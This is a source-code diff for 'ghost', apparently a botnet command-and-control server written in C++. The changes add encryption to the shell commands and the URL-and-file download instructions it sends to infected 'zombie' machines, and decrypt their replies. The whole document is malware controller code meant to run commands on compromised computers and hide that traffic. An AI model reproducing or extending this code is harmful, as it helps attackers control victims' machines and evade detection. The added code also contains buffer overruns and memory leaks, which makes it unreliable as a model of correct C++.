@@ -20,7 +20,7 @@
 	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#define					DEFAULT_BUFF	19056
+#define					DEFAULT_BUFF		19056
 #define					AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger
 
 #define					SHOW_CONSOLE()		{ AllocConsole(); LOG("%s\n\n", c_ascii); b_hidden = false; }
@@ -67,6 +67,7 @@ HANDLE					h_gui;
 AHXRSERVER				a_server;
 
 #include				"gui.h" // Tray icon.
+#include				"encrypt.h" // CMD encryption
 
 #pragma comment			(lib, "Wininet.lib")
 #pragma comment			(lib, "user32.lib")
@@ -266,25 +267,37 @@ DWORD WINAPI t_gui(LPVOID params) {
 											
 												getline( std::cin, s_cmd );
 
-												c_cmd = const_cast<char *>(s_cmd.c_str());
+												c_cmd = new char[s_cmd.length() + 1];
+												
+												strcpy(c_cmd, s_cmd.data());
+												s_cmd = encryptCMD(s_cmd);
 
+												int i_length = s_cmd.length();
+
+												char * c_read = new char[i_length];
+												c_read = const_cast<char *>(s_cmd.c_str());
+
+												// Null terminating. Without this, there will be gibberish at the end of the data.
+												c_read[i_length] = '\0';
+												if (c_read[i_length - 1] == '\n')
+													c_read[i_length - 1] = '\0';
+									
 												if (!strcmp(c_cmd, "exit")) {
-													SHOW_MENU();
 													i_menu = 0;
 													i_option = 0;
 													c_cmd = "";
 													break;
 												}
 
-												int i_res = send(client_data.socketRef, c_cmd, strlen(c_cmd) + 1, 0);
+												int i_res = send(client_data.socketRef, c_read, strlen(c_cmd) + 1, 0);
 												if (i_res == SOCKET_ERROR) {
 													ERROR("There was an error running this command. There is no connection to this zombie.\n");
-													SHOW_MENU();
-													
+		
 													c_cmd = "exit";
 													i_menu = 0;
 													
 													ghostlib::deleteZombie(i_option - 1);
+													i_option = 0;
 													break;
 												}
 												else {
@@ -313,7 +326,6 @@ DWORD WINAPI t_gui(LPVOID params) {
 
 											if (!strcmp(c_cmd, "exit")) {
 												i_menu = 0;
-												SHOW_MENU();
 												break;
 											}
 
@@ -325,7 +337,6 @@ DWORD WINAPI t_gui(LPVOID params) {
 
 											if (!strcmp(c_file, "exit")) {
 												i_menu = 0;
-												SHOW_MENU();
 												break;
 											}
 
@@ -333,7 +344,10 @@ DWORD WINAPI t_gui(LPVOID params) {
 											URL_DATA["URL"] = s_cmd;
 											URL_DATA["FILE"] = s_file;
 
-											int i_res = send(client_data.socketRef, URL_DATA.dump().c_str(), strlen(URL_DATA.dump().c_str()) + 1, 0);
+											string s_json_dump = URL_DATA.dump();
+											s_json_dump = encryptCMD(s_json_dump);
+
+											int i_res = send(client_data.socketRef, s_json_dump.data(), strlen(URL_DATA.dump().c_str()) + 1, 0);
 											if (i_res == SOCKET_ERROR) {
 												ERROR("There was an error running this. There is no connection to this zombie.\n");
 												SHOW_MENU();
@@ -342,6 +356,7 @@ DWORD WINAPI t_gui(LPVOID params) {
 												i_menu = 0;
 
 												ghostlib::deleteZombie(i_option - 1);
+												i_option = 0;
 												break;
 											}
 											else {
@@ -352,7 +367,6 @@ DWORD WINAPI t_gui(LPVOID params) {
 
 												c_cmd = "exit";
 												i_menu = 0;
-												SHOW_MENU();
 											}
 										}
 										break;
@@ -418,6 +432,8 @@ void onServerClientConnect(SOCKET clientSocket, CLIENTDATA info) {
 
 void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
 	string s_data = data;
+	s_data = unencryptCMD(s_data);
+	strcpy(data, s_data.data());
 	
 	if (b_waiting) {
 		LOG("[RESPONSE]\n%s", data);
